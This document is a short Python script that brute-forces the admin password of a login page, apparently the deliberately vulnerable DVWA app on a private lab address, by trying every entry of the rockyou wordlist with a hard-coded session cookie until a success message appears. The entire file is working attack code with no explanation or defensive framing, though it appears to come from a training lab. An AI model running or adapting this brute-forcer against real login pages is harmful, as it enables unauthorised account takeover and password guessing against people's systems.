import requests


base_url = "http://10.10.241.196"
login_url = f"{base_url}/vulnerabilities/brute/"
cookies = {
    'PHPSESSID': 'oum0iaoe530vblhijrh5gp3md7',
    'security': 'low'
}

wordlist_file = "/usr/share/wordlists/rockyou.txt"


def brute_force(login_url):
    with open(wordlist_file, "r", encoding="latin-1") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        params = {
            'username': 'admin',
            'password': password,
            'Login': 'Login'
        }
        print(f"Testing with password: {password}")

        try:
            response = requests.get(login_url, params=params, cookies=cookies)
            print(f"Response status code: {response.status_code}")

            if response.status_code == 200:
                print(f"Response text:\n{response.text[:200]}...\n")  # Print the first 200 characters of the response

                # Check if the response indicates a successful login
                if "Welcome to the password protected area" in response.text:
                    print(f"Successful login with password: {password}")
                    break
            else:
                print(f"Unexpected status code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"Request Exception: {e}")

        print("---------------------------------------------------")


brute_force(login_url)

